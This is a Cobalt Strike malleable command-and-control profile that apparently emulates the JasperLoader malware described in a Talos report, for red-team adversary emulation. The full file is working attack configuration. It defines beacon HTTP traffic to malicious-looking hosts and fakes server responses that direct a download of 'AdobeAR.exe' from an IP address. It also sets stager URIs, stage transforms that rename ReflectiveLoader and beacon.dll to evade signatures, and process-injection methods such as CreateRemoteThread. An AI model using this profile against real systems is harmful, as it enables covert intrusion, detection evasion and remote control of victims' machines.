#jasperloader.profile
#https://blog.talosintelligence.com/2019/04/jasperloader-targets-italy.html
#https://app.any.run/tasks/39e6bd26-b580-4335-89de-69483d745efb/
#xx0hcd

###global options###
#sleeptime from report, image 'Figure 22: Stage 2 — JavaScript retrieval'
set sleeptime "180000";
set jitter    "33";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38";

set sample_name "jasperloader.profile";

http-get {

    set uri "/loadercrypt_823EF8A810513A4071485C36DDAD4CC3.php";

    set verb "GET";
    
    client {

        header "Host" "cdn.zaczvk.pl";
        header "Connection" "Keep-Alive";

	   
        metadata {
            base64url;
            parameter "vid";
        }

    }

    server {
        header "Server" "nginx/1.14.2";
        header "Content-Type" "text/html; charset=UTF-8";
        header "Connection" "keep-alive";
        header "X-Powered-By" "PHP/5.4.16";
       
        output {

            netbios;
            	     
	    prepend "\nfiuyc= \"";

	    append "\";\n";
            append "xfbjixjsytvxjyuvcaxhfehv = new Array();\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"i95BtfTT\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"C(\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"wVC3Ea\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"93V6x46z\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"9E7txtA6tRS3>SzSt4w\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"Bv9\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"xta7\");\n";
	    append "xfbjixjsytvxjyuvcaxhfehv.push(\"49\");\n";

            print;
        }
    }
}

http-post {
    
    set uri "/";
    set verb "GET";
    #set verb "POST";

    client {


	header "Host" "space.bajamelide.ch";
	header "Connection" "Keep-Alive";     
        
        output {
            base64url; 
	    parameter "b";
        }

        id {
	    base64url;
	    parameter "v";
          
        }
    parameter "psver" "5";
    }

    server {
        header "Server" "nginx/1.14.2";
        header "Content-Type" "text/html; charset=UTF-8";
        header "Content-Length" "89";
        header "Connection" "keep-alive";
        header "X-Powered-By" "PHP/5.4.16";

        output {
            netbios;	    
	   
#	    prepend "\n";
            prepend "d|http://31.214.157.69/";

	    append "|AdobeAR.exe|http://cdn.zaczvk.pl/moddownloadok.php";
            print;
        }
    }
}

http-stager {

    set uri_x86 "/501";
    set uri_x64 "/502";

    client {
        header "Host" "cloud.diminishedvaluecalifornia.com";
        header "Connection" "Keep-Alive";

        parameter "dwgvhgc" "";
    }

    server {
        header "Server" "Apache/2.2.15 (CentOS)";
        header "Last-Modified" "Tue, 22 Jan 2019 16:31:28 GMT";
        header "ETag" "9f688-4-5800e82560818";
        header "Accept-Ranges" "bytes";
        header "Content-Length" "4";
        header "Connection" "close";
        header "Content-Type" "text/html; charset=UTF-8";
    
        output{
            prepend "500\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
            print;
        }

    }


}




###Malleable PE Options###

post-ex {

    set spawnto_x86 "%windir%\\syswow64\\wscript.exe";
    set spawnto_x64 "%windir%\\sysnative\\wscript.exe";

    set obfuscate "false";

    set smartinject "false";

    set amsi_disable "false";

}

#used peclone on sample from 2nd stage gootkit using same domains, https://app.any.run/tasks/39e6bd26-b580-4335-89de-69483d745efb/
stage {
    set checksum        "0";
    set compile_time    "15 Apr 2015 01:24:00";
    set entry_point     "8208";
    set image_size_x86  "2560000";
    set image_size_x64  "2560000";
    #set name	        "";
    set userwx 	        "false";
    set cleanup	        "false";
    set sleep_mask	"false";
    set stomppe         "false";
    set obfuscate       "false";
    set rich_header     "";
    
    set sleep_mask "false";

#    set module_x86 "";
#    set module_x64 "";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "6ayBRVW";
        strrep "beacon.dll" "uVRWRut";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "6ayBRVW";
        strrep "beacon.x64.dll" "uVRWRut";
        }

#can set a string in the .rdata section of the beacon dll.
    #adds a zero-terminated string
    #string "something";

    #adds a string 'as-is'
    #data "something";

    #adds a wide (UTF-16LE encoded) string
    stringw "IMAGE_SCN_MEM_READ"; 
}


#controls process injection behavior
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        CreateThread;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}    
